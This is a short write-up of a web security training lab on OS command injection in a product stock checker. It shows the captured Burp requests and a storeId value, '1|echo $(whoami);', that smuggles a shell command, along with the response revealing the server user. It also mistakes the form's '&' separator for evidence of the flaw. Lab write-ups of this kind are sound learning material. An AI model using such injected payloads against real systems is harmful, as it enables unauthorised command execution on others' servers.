*This lab contains an OS command injection vulnerability in the product stock checker. The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. To solve the lab, execute the whoami command to determine the name of the current user. *

Greeted with a home screen with all the products. I then clicked on one of the product and noticed that there was a *check stock* feature. 
Clicking on the check stock feature return *62 units*. I then checked my HTTP history in Burp and noticed the following: 

```Burp 
POST /product/stock HTTP/2
Host: 0a3a0068030e31fb8078b77f00a70012.web-security-academy.net
Cookie: session=8LVc8zfF8sdeHVlZmrmbECpmEy9V0pqz
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3a0068030e31fb8078b77f00a70012.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a3a0068030e31fb8078b77f00a70012.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

productId=1&storeId=1
```

At the bottom, there is the use of the separator `&`. Hence, this site is vulnerable to a OS command injection. I then sent this to the Repeater. I added another separator to execute `echo $(whoami)` modifying the additional separator until I got the user name in the response:
```Burp 
POST /product/stock HTTP/2
Host: 0a3a0068030e31fb8078b77f00a70012.web-security-academy.net
Cookie: session=8LVc8zfF8sdeHVlZmrmbECpmEy9V0pqz
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3a0068030e31fb8078b77f00a70012.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://0a3a0068030e31fb8078b77f00a70012.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

productId=1&storeId=1|echo $(whoami);
```

This was the successful response: 

```Burp 
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-oFchTu
```

